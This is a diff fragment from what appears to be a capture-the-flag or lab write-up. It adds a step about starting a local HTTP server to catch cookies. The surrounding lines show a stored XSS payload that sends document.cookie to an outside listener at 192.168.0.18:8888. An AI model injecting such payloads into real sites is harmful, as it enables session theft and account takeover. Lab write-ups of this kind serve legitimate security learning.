@@ -228,6 +228,11 @@ Let's edit our profile and use this XSS.
 <script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
 ```
 
+Start local http server and waiting cookie
+
+```
+
+```
 
 
 # Privilege Escalation#1
